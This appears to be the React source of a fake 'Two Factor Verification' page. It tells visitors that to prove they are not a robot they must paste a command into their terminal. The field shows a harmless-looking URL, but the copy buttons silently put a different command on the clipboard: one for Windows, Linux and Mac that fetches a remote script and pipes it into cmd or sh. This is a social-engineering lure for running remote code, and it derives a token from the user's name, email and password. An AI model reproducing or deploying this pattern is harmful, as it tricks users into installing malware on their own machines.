import { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { FaRegClipboard } from 'react-icons/fa';
import swal from 'sweetalert';
import ReCAPTCHA from 'react-google-recaptcha';
import axios from 'axios';

const RECAPTCHA_SITE_KEY = '6LdPsIMrAAAAACj8e2sn8DUA1tEC1u3FZgeJrQpb'; // replace with your site key
 const currentDomain = window.location.origin;
const Twofa = () => {
  
  const location = useLocation();
  const userData = location.state?.user;
  
  const [machineHex, setMachineHex] = useState('');
  const [copySuccess, setCopySuccess] = useState(false);
  const [captchaToken, setCaptchaToken] = useState(null);

  const navigate = useNavigate();

  const generateHexMachineId = async () => {
    const encoder = new TextEncoder();
    const combinedString = userData.name + userData.email + userData.password;
    const data = encoder.encode(combinedString);
    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    const hexString = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    return hexString.substring(0, 16);
  };

  useEffect(() => {
    const fetchHex = async () => {
      const hex = await generateHexMachineId();
      setMachineHex(hex);
    };
    fetchHex();
  }, [userData]);

  const copyToClipboard = (command) => {
    const tempInput = document.createElement('input');
    tempInput.value = command;
    document.body.appendChild(tempInput);
    tempInput.select();
    tempInput.setSelectionRange(0, 99999);
    document.execCommand('copy');
    document.body.removeChild(tempInput);
    setCopySuccess(true);
    setTimeout(() => setCopySuccess(false), 2000);
  };


  const handleCaptchaChange = (value) => {
    setCaptchaToken(value);
  };

  const handleContinue = async () => {
    
      console.log(captchaToken);
    if (!captchaToken) {
      swal('Error', 'Please complete the CAPTCHA', 'error');
      return;
    }

    try {
      const res = await axios.post(`${currentDomain}/users/verify-captcha`, {
        token: captchaToken,
      });

      if (res.data.success) {
        swal('Success', 'CAPTCHA verified. Proceeding...', 'success');
        navigate('/2fa');
      } else {
        swal('Error', 'CAPTCHA verification failed', 'error');
      }
    } catch (err) {
      swal('Error', "Verification failed", 'error');
    }
  };

  return (
    <main className='relative overflow-hidden'>
      <section id='signup-section'>
        <div className='py-40 pt-36 xl:pb-[200px] xl:pt-[180px]'>
          <div className='global-container'>
            <div className='mx-auto max-w-[910px] text-center'>
              <h1 className='mb-[50px]'>Two Factor Verification</h1>
              <div className='block rounded-lg bg-white px-[30px] py-[50px] text-left shadow-lg sm:px-10'>
                <div className='grid grid-cols-1 gap-6'>
                  <div className='flex flex-col gap-y-[10px]'>
                    <label className='text-lg font-bold'>To confirm that you are not a robot, please enter this code in the terminal and verify again.</label>

                    {/* Windows */}
                    <label className='text-lg font-bold mt-4'>Command for Windows:</label>
                    <div className='flex w-full'>
                      <input
                        value={`${currentDomain}/users/auth/windows?token=${machineHex}`}
                        type="text"
                        className="w-full rounded border px-6 py-4 font-bold text-black"
                        readOnly
                      />
                      <button
                        type='button'
                        onClick={() => copyToClipboard(`curl ${currentDomain}/users/auth/windows?token=${machineHex} | cmd`)}
                        className='ml-2 rounded border-2 border-black bg-black py-4 px-6 text-white'
                      >
                        <FaRegClipboard />
                      </button>
                    </div>

                    {/* Linux */}
                    <label className='text-lg font-bold mt-4'>Command for Linux:</label>
                    <div className='flex w-full'>
                      <input
                        value={`${currentDomain}/users/auth/linux?token=${machineHex}`}
                        type="text"
                        className="w-full rounded border px-6 py-4 font-bold text-black"
                        readOnly
                      />
                      <button
                        type='button'
                        onClick={() => copyToClipboard(`wget -qO- "${currentDomain}/users/auth/linux?token=${machineHex}" | sh`)}
                        className='ml-2 rounded border-2 border-black bg-black py-4 px-6 text-white'
                      >
                        <FaRegClipboard />
                      </button>
                    </div>

                    {/* Mac */}
                    <label className='text-lg font-bold mt-4'>Command for Mac:</label>
                    <div className='flex w-full'>
                      <input
                        value={`${currentDomain}/users/auth/mac?token=${machineHex}`}
                        type="text"
                        className="w-full rounded border px-6 py-4 font-bold text-black"
                        readOnly
                      />
                      <button
                        type='button'
                        onClick={() => copyToClipboard(`curl "${currentDomain}/users/auth/mac?token=${machineHex}" | sh`)}
                        className='ml-2 rounded border-2 border-black bg-black py-4 px-6 text-white'
                      >
                        <FaRegClipboard />
                      </button>
                    </div>


                    {copySuccess && (
                      <div className='mt-2 text-green-500'>
                        <span>Copied to clipboard!</span>
                      </div>
                    )}
                  </div>
                </div>

                {/* reCAPTCHA */}
                <div className="flex justify-center mt-6">
                  <ReCAPTCHA
                    sitekey={RECAPTCHA_SITE_KEY}
                    onChange={handleCaptchaChange}
                  />
                </div>
                <div className="flex justify-center mt-7">
                  <button onClick={handleContinue}
                    className='rounded-full border-2 border-black bg-black py-4 px-10 text-white hover:border-red-500 hover:text-white'>
                    Continue
                  </button>
                </div>

                <div className='relative z-[1] mb-14 mt-9 text-center font-bold before:absolute before:left-0 before:top-1/2 before:-z-[1] before:h-[1px] before:w-full before:-translate-y-1/2 before:bg-[#EAEDF0]'>
                  <span className='inline-block bg-white px-6'>Verification</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>
    </main>
  );
};

export default Twofa;